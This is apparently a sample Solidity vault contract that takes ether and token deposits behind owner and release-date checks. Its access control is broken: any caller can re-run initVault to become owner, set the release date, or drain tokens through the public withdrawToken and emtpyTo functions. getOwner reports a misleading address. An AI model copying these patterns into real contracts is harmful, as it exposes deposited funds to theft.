pragma solidity ^0.4.17;
contract Token {
	function balanceOf(address who) view public returns(uint256 );function transfer(address to, uint amount) public returns(bool );
}contract Ownable {
	address Owner = msg.sender;
	modifier onlyOwner(){
	if(msg.sender == Owner){
	_;}
	}
	function transferOwnership(address to) onlyOwner public {
	Owner = to;
	}
	
}contract TokenVault is Ownable {
	address self = address(this);
	function withdrawTokenTo(address token, address to, uint amount) onlyOwner public returns(bool ){
	return Token(token).transfer(to, amount);
	}
	function withdrawToken(address token) public returns(bool ){
	return withdrawTokenTo(token, msg.sender, Token(token).balanceOf(self));
	}
	function emtpyTo(address token, address to) public returns(bool ){
	return withdrawTokenTo(token, to, Token(token).balanceOf(self));
	}
	
}contract Vault is TokenVault {
	event Deposit(address indexed depositor, uint amount);
	event Withdrawal(address indexed to, uint amount);
	event OpenDate(uint date);
	mapping(address => uint) public Deposits;
	uint minDeposit;
	bool Locked;
	uint Date;
	function initVault() open payable public {
	Owner = msg.sender;
	minDeposit = 0.25 ether;
	Locked = false;
	deposit();
	}
	function MinimumDeposit() view public returns(uint ){
	return minDeposit;
	}
	function ReleaseDate() view public returns(uint ){
	return Date;
	}
	function WithdrawEnabled() view public returns(bool ){
	return Date > 0 && Date <= now;
	}
	function () payable public {
	deposit();
	}
	function deposit() payable public {
	if(msg.value > 0){
	if(msg.value >= MinimumDeposit()){
	Deposits[msg.sender] += msg.value;
	}
	Deposit(msg.sender, msg.value);
	}
	}
	function setRelease(uint newDate) public {
	Date = newDate;
	OpenDate(Date);
	}
	function withdraw(address to, uint amount) onlyOwner public {
	if(WithdrawEnabled()){
	uint max = Deposits[msg.sender];
	if(max > 0 && amount <= max){
	to.transfer(amount);
	Withdrawal(to, amount);
	}
	}
	}
	function lock() public {
	Locked = true;
	}
	address inited;
	modifier open(){
	if(! Locked){
	_;}
	inited = msg.sender;
	}
	function kill() public {
	require((this.balance >= 0) && (this.balance < (0 + 1)));
	selfdestruct(Owner);
	}
	function getOwner() view external returns(address ){
	return inited;
	}
	
}